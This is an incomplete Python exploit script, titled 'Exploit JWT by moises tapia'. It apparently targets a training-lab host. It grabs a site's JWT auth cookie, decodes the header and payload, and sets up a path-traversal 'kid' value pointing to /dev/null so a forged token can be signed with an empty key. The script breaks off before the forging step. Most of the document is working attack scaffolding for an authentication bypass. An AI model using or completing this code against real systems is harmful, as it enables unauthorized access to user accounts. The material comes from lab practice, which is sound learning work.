import hmac
import base64
import hashlib
import json
import requests as req
from colorama import Fore

MAG = Fore.MAGENTA
RRED = Fore.LIGHTRED_EX
CYYAN = Fore.LIGHTCYAN_EX
RESETT = Fore.RESET

# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y

# HEADER = 
url = 'http://ptl-b0463287-13ca6bf2.libcurl.so/'

s = req.Session()

# Get the Cokkie
response = s.get(url)
headers_info = s.cookies.get_dict()

exploit = "../../../../../../../../../../dev/null" # you can change this path
headers_components = ['header', 'payload', 'signature']
space = headers_info['auth'].split('.')

print("\n" + "\t" + "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀" * 2)
print("\t\t" + "Exploit JWT by moises tapia")
print("\t" + "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀" * 2 + "\n")

for clave, valor in headers_info.items():
    print("Your Cookie is: " + CYYAN + valor + RESETT)


#for head, resp in zip(headers_components, space):
#    print ('{0}: {1}.'.format(head, resp))

print("\n" + "Get the each components of Cookie: " + "\n")
print(headers_components[0] + ': ' + RRED + str(space[0]) + RESETT)
print(headers_components[1] + ': ' + MAG + str(space[1]) + RESETT)
print(headers_components[2] + ': ' + CYYAN + str(space[2]) + RESETT)

print("\n" + "Decode Header and payload...."+ "\n")

base64_header = str(space[0] + '==')
base64_payload = str(space[1] + '==')

base64_bytes = base64_header.encode('ascii')
message_bytes = base64.b64decode(base64_bytes)

base64_bytes2 = base64_payload.encode('ascii')
message_bytes2 = base64.b64decode(base64_bytes2)

header_decode = message_bytes.decode('ascii')
payload_decode = message_bytes2.decode('ascii')

print("HEADER: " + RRED + header_decode + RESETT)
print(type(header_decode))
print("PAYLOAD: " + MAG + payload_decode + RESETT)

print("\n" + "Ecode the new payload...."+ "\n")


